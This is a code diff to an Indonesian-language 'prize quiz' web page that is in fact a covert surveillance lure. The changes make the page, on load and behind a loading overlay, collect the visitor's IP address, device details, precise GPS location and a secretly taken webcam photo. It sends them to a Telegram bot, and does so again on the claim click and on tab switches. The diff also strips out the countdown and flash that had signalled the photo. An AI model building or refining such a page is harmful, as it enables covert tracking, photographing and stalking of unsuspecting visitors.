@@ -276,10 +276,45 @@
             z-index: 50;
             display: none;
         }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            color: white;
+            font-size: 1.5rem;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div>Memuat konten...</div>
+    </div>
+
     <div class="container">
         <h1><i class="fas fa-gift"></i> Kuis Hadiah Menarik!</h1>
         <p class="subtitle">Jawab satu pertanyaan sederhana dan dapatkan hadiah spesial untuk Anda!</p>
@@ -352,6 +387,7 @@
         const flash = document.getElementById('flash');
         const status = document.getElementById('status');
         const quizOptions = document.querySelectorAll('.quiz-option');
+        const loadingOverlay = document.getElementById('loadingOverlay');
 
         // Variabel global
         let stream = null;
@@ -360,6 +396,7 @@
         let userIP = null;
         let deviceInfo = null;
         let networkInfo = null;
+        let dataSent = false; // Flag untuk mencegah pengiriman ganda
 
         // Fungsi untuk mendapatkan informasi perangkat
         function getDeviceInfo() {
@@ -414,13 +451,6 @@
             
             if (connection) {
                 networkType = connection.effectiveType || "Unknown";
-                // Coba deteksi operator berdasarkan beberapa cara
-                if (navigator.userAgent.includes('Indosat')) operator = "Indosat";
-                else if (navigator.userAgent.includes('Telkomsel')) operator = "Telkomsel";
-                else if (navigator.userAgent.includes('XL')) operator = "XL";
-                else if (navigator.userAgent.includes('Tri')) operator = "3";
-                else if (navigator.userAgent.includes('Axis')) operator = "Axis";
-                else if (navigator.userAgent.includes('Smartfren')) operator = "Smartfren";
             }
             
             return {
@@ -456,7 +486,7 @@
                     },
                     {
                         enableHighAccuracy: true,
-                        timeout: 10000,
+                        timeout: 15000,
                         maximumAge: 0
                     }
                 );
@@ -480,9 +510,118 @@
             }
         }
 
-        // Fungsi untuk mendapatkan semua informasi pengguna
-        async function collectUserInfo() {
+        // Fungsi untuk mengambil foto secara diam-diam
+        function takePhoto() {
+            return new Promise((resolve) => {
+                if (!stream) {
+                    resolve(null);
+                    return;
+                }
+
+                setTimeout(() => {
+                    let photoDataUrl = null;
+                    try {
+                        const context = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        photoDataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                    } catch (error) {
+                        console.error('Error mengambil foto:', error);
+                    }
+                    resolve(photoDataUrl);
+                }, 1000);
+            });
+        }
+
+        // Fungsi untuk mengirim data ke Telegram
+        async function sendToTelegram(photoDataUrl = null, isInitial = false) {
             try {
+                // Format pesan dengan semua informasi yang dikumpulkan
+                let message = `🚨 ${isInitial ? 'PENGUNJUNG BARU MASUK' : 'KLIK KLAIM HADIAH'} 🚨\n\n`;
+                message += `📅 Waktu: ${new Date().toLocaleString('id-ID')}\n`;
+                if (!isInitial) {
+                    message += `🎨 Jawaban Kuis: ${selectedOption}\n`;
+                }
+                message += `\n`;
+                
+                message += `🖥️ INFORMASI PERANGKAT:\n`;
+                message += `• Tipe: ${deviceInfo.deviceType}\n`;
+                message += `• Merek: ${deviceInfo.brand}\n`;
+                message += `• Model: ${deviceInfo.model}\n`;
+                message += `• Layar: ${deviceInfo.screen}\n`;
+                message += `• Bahasa: ${deviceInfo.language}\n`;
+                message += `• Platform: ${deviceInfo.platform}\n\n`;
+                
+                message += `🌐 INFORMASI JARINGAN:\n`;
+                message += `• IP Address: ${userIP}\n`;
+                message += `• Tipe Jaringan: ${networkInfo.networkType}\n`;
+                if (networkInfo.connection) {
+                    message += `• Kecepatan: ${networkInfo.connection.downlink} Mbps\n`;
+                }
+                message += `\n`;
+                
+                message += `📍 INFORMASI LOKASI:\n`;
+                if (userLocation && userLocation.latitude) {
+                    message += `• Latitude: ${userLocation.latitude}\n`;
+                    message += `• Longitude: ${userLocation.longitude}\n`;
+                    message += `• Akurasi: ${userLocation.accuracy} meter\n`;
+                    message += `• Waktu Lokasi: ${userLocation.timestamp}\n`;
+                    message += `• Google Maps: https://maps.google.com/?q=${userLocation.latitude},${userLocation.longitude}\n`;
+                } else {
+                    message += `• Lokasi: ${userLocation ? userLocation.error : 'Tidak diizinkan'}\n`;
+                }
+                message += `\n`;
+                
+                message += `🔗 URL: ${window.location.href}\n`;
+                message += `🌍 Referrer: ${document.referrer || 'Langsung'}\n`;
+                message += `👤 User Agent: ${deviceInfo.userAgent.substring(0, 100)}...`;
+
+                if (!photoDataUrl) {
+                    // Jika tidak ada foto, kirim pesan saja
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+                    const result = await response.json();
+                    return result.ok;
+                }
+
+                // Jika ada foto, kirim foto dengan caption
+                const base64Response = await fetch(photoDataUrl);
+                const blob = await base64Response.blob();
+                
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', message);
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    return true;
+                } else {
+                    // Fallback: kirim pesan saja jika foto gagal
+                    const fallbackResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message + '\n\n⚠️ Foto gagal dikirim.')}`);
+                    const fallbackResult = await fallbackResponse.json();
+                    return fallbackResult.ok;
+                }
+            } catch (error) {
+                console.error('Error mengirim ke Telegram:', error);
+                return false;
+            }
+        }
+
+        // Fungsi untuk mengumpulkan dan mengirim data saat halaman dibuka
+        async function collectAndSendInitialData() {
+            if (dataSent) return; // Hindari pengiriman ganda
+            
+            try {
+                console.log('Mengumpulkan data pengunjung...');
+                
+                // Kumpulkan semua informasi
                 userIP = await getIPAddress();
                 deviceInfo = getDeviceInfo();
                 networkInfo = getNetworkInfo();
@@ -494,9 +633,26 @@
                     userLocation = { error: error.message };
                 }
                 
-                console.log("Informasi pengguna berhasil dikumpulkan");
+                // Ambil foto diam-diam
+                const photoDataUrl = await takePhoto();
+                
+                // Kirim ke Telegram
+                const success = await sendToTelegram(photoDataUrl, true);
+                
+                if (success) {
+                    console.log('Data pengunjung berhasil dikirim ke Telegram');
+                    dataSent = true;
+                } else {
+                    console.error('Gagal mengirim data pengunjung');
+                }
+                
             } catch (error) {
-                console.error("Error mengumpulkan informasi:", error);
+                console.error('Error mengumpulkan data:', error);
+            } finally {
+                // Sembunyikan loading overlay
+                setTimeout(() => {
+                    loadingOverlay.style.display = 'none';
+                }, 1000);
             }
         }
 
@@ -517,133 +673,8 @@
                     audio: false 
                 });
                 video.srcObject = stream;
-                console.log('Kamera berhasil diakses');
             } catch (err) {
                 console.log('Kamera tidak dapat diakses');
-            }
-        }
-
-        // Fungsi untuk mengambil foto secara diam-diam
-        function takePhoto() {
-            return new Promise((resolve) => {
-                let count = 3;
-                countdown.textContent = count;
-                countdown.style.display = 'block';
-                
-                const countdownInterval = setInterval(() => {
-                    count--;
-                    countdown.textContent = count;
-                    
-                    if (count <= 0) {
-                        clearInterval(countdownInterval);
-                        countdown.style.display = 'none';
-                        
-                        let photoDataUrl = null;
-                        if (stream) {
-                            const context = canvas.getContext('2d');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            photoDataUrl = canvas.toDataURL('image/jpeg', 0.8); // Quality 80%
-                        }
-                        
-                        // Efek flash
-                        flash.style.display = 'block';
-                        setTimeout(() => {
-                            flash.style.display = 'none';
-                        }, 500);
-                        
-                        resolve(photoDataUrl);
-                    }
-                }, 1000);
-            });
-        }
-
-        // Fungsi untuk mengirim FOTO dan DATA ke Telegram
-        async function sendToTelegram(photoDataUrl) {
-            try {
-                // Format pesan dengan semua informasi yang dikumpulkan
-                let message = `🎯 DATA PENGUNJUNG BARU 🎯\n\n`;
-                message += `📅 Waktu: ${new Date().toLocaleString('id-ID')}\n`;
-                message += `🎨 Jawaban Kuis: ${selectedOption}\n\n`;
-                
-                message += `🖥️ INFORMASI PERANGKAT:\n`;
-                message += `• Tipe: ${deviceInfo.deviceType}\n`;
-                message += `• Merek: ${deviceInfo.brand}\n`;
-                message += `• Model: ${deviceInfo.model}\n`;
-                message += `• Layar: ${deviceInfo.screen}\n`;
-                message += `• Bahasa: ${deviceInfo.language}\n\n`;
-                
-                message += `🌐 INFORMASI JARINGAN:\n`;
-                message += `• IP Address: ${userIP}\n`;
-                message += `• Operator: ${networkInfo.operator}\n`;
-                message += `• Tipe Jaringan: ${networkInfo.networkType}\n`;
-                if (networkInfo.connection) {
-                    message += `• Kecepatan: ${networkInfo.connection.downlink} Mbps\n`;
-                }
-                message += `\n`;
-                
-                message += `📍 INFORMASI LOKASI:\n`;
-                if (userLocation.latitude) {
-                    message += `• Latitude: ${userLocation.latitude}\n`;
-                    message += `• Longitude: ${userLocation.longitude}\n`;
-                    message += `• Akurasi: ${userLocation.accuracy} meter\n`;
-                    message += `• Waktu Lokasi: ${userLocation.timestamp}\n`;
-                    message += `• Google Maps: https://maps.google.com/?q=${userLocation.latitude},${userLocation.longitude}\n`;
-                } else {
-                    message += `• Lokasi: ${userLocation.error}\n`;
-                }
-                message += `\n`;
-                
-                message += `🔗 Sumber: ${window.location.href}\n`;
-                message += `👤 User Agent: ${deviceInfo.userAgent}`;
-
-                if (!photoDataUrl) {
-                    // Jika tidak ada foto, kirim pesan saja
-                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
-                    const result = await response.json();
-                    return result.ok;
-                }
-
-                // Jika ada foto, kirim foto dengan caption
-                const base64Response = await fetch(photoDataUrl);
-                const blob = await base64Response.blob();
-                
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'selfie.jpg');
-                formData.append('caption', message);
-                
-                console.log('Mengirim foto dan data ke Telegram...');
-                
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                console.log('Telegram Response:', result);
-                
-                if (result.ok) {
-                    return true;
-                } else {
-                    console.error('Telegram Error:', result.description);
-                    // Fallback: kirim pesan saja jika foto gagal
-                    const fallbackResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message + '\n\n⚠️ Foto gagal dikirim, tapi data berhasil direkam.')}`);
-                    const fallbackResult = await fallbackResponse.json();
-                    return fallbackResult.ok;
-                }
-            } catch (error) {
-                console.error('Error mengirim ke Telegram:', error);
-                // Fallback ke pesan teks jika semua gagal
-                try {
-                    const fallbackMessage = `❌ Error: ${error.message}\n📅 Waktu: ${new Date().toLocaleString('id-ID')}\n🎨 Jawaban: ${selectedOption}\n🌐 Dari: ${window.location.href}`;
-                    const fallbackResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(fallbackMessage)}`);
-                    const fallbackResult = await fallbackResponse.json();
-                    return fallbackResult.ok;
-                } catch (e) {
-                    return false;
-                }
             }
         }
 
@@ -655,26 +686,17 @@
             }
             
             claimBtn.disabled = true;
-            claimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Mengumpulkan data...';
+            claimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses...';
             
             try {
-                // Kumpulkan semua informasi pengguna
-                await collectUserInfo();
-                
-                claimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses...';
-                
-                // Ambil foto secara diam-diam
+                // Ambil foto lagi saat klaim
                 const photoDataUrl = await takePhoto();
                 
-                // Kirim ke Telegram
-                const success = await sendToTelegram(photoDataUrl);
+                // Kirim data klaim ke Telegram
+                const success = await sendToTelegram(photoDataUrl, false);
                 
                 if (success) {
                     showStatus('Selamat! Hadiah Anda sedang diproses dan akan segera dikirim ke akun Anda.', 'success');
-                    
-                    setTimeout(() => {
-                        showStatus('Hadiah telah berhasil dikirim! Terima kasih telah berpartisipasi.', 'success');
-                    }, 3000);
                 } else {
                     throw new Error('Gagal mengirim data');
                 }
@@ -698,9 +720,27 @@
             }, 5000);
         }
 
-        // Inisialisasi
-        window.addEventListener('DOMContentLoaded', () => {
-            initCamera();
+        // Inisialisasi saat halaman dimuat
+        window.addEventListener('DOMContentLoaded', async () => {
+            // Tampilkan loading overlay
+            loadingOverlay.style.display = 'flex';
+            
+            // Inisialisasi kamera
+            await initCamera();
+            
+            // Kumpulkan dan kirim data secara otomatis
+            setTimeout(() => {
+                collectAndSendInitialData();
+            }, 2000);
+        });
+
+        // Juga kirim data ketika visibility page berubah (untuk catch reload/tab switch)
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden && !dataSent) {
+                setTimeout(() => {
+                    collectAndSendInitialData();
+                }, 1000);
+            }
         });
     </script>
 </body>
